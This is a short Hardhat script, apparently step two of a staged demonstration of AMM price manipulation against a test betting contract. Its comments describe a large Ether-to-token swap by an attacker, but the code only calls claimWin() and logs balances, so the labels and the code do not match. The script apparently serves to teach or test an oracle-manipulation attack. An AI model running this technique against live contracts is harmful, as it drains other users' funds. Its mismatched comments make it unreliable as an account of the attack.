//******* Step 2: Attacker manipulates AMM rate by making large swap  */
//---- swap Ether to Token ----*/

const {ethers} = require ("hardhat");
const {
    TestToken,
    BetContract,
    AMM,
    AMM_Address,
     alchemyProvider,
     BetContract_Address,
     signer
} = require ("./beforeEach.js");
(async () => {
     try {  
        
        console.log("amm Balance token", ethers.formatUnits(await TestToken.balanceOf(signer.address)) )
        console.log("amm balance ether", ethers.formatUnits(await alchemyProvider.getBalance(BetContract_Address)) )  

        const tx = await BetContract.claimWin();
        await tx.wait();
        console.log(tx);

        console.log("amm Balance token", ethers.formatUnits(await TestToken.balanceOf(signer.address)) )
        console.log("amm balance ether", ethers.formatUnits(await alchemyProvider.getBalance(BetContract_Address)) )  

        } catch (error) {
          console.error("Error fetching AMM rate:", error);
        }
})();